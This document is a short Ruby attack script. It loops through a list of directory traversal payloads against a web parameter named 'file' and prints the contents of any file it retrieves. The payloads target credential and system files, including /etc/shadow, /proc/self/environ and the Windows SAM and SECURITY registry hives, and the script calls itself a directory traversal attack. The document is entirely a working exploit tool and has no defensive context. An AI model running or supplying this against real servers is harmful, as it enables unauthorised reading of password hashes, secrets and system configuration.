require 'net/http'
require 'uri'

# Target URL and vulnerable parameter
target_url = 'http://example.com/vulnerable_page'
vulnerable_param = 'file'

# List of common directory traversal payloads
payloads = [
  "../../../../../../../../etc/passwd",
  "../../../../../../../../etc/shadow",
  "../../../../../../../../etc/hosts",
  "../../../../../../../../proc/self/environ",
  "../../../../../../../../windows/win.ini",
  "../../../../../../../../windows/system32/drivers/etc/hosts",
  "../../../../../../../../../../boot.ini",
  "../../../../../../../../../../windows/system32/config/sam",
  "../../../../../../../../../../windows/system32/config/system",
  "../../../../../../../../../../windows/system32/config/software",
  "../../../../../../../../../../windows/system32/config/security",
  "../../../../../../../../../../windows/system32/config/default",
  "../../../../../../../../../../usr/local/apache/logs/access_log",
  "../../../../../../../../../../usr/local/apache/logs/error_log"
]

# Function to attempt directory traversal
def attempt_traversal(uri)
  response = Net::HTTP.get_response(uri)
  if response.is_a?(Net::HTTPSuccess)
    return response.body
  else
    return nil
  end
end

# Iterate through payloads
payloads.each do |payload|
  uri = URI.parse("#{target_url}?#{vulnerable_param}=#{payload}")
  puts "Trying payload: #{payload}"
  
  response_body = attempt_traversal(uri)
  
  if response_body
    puts "Successful Directory Traversal with payload: #{payload}"
    puts "Response Body:\n#{response_body[0..500]}" # Print first 500 characters of the response
    break
  else
    puts "Failed Directory Traversal with payload: #{payload}"
  end
end

puts "Directory Traversal attack completed."
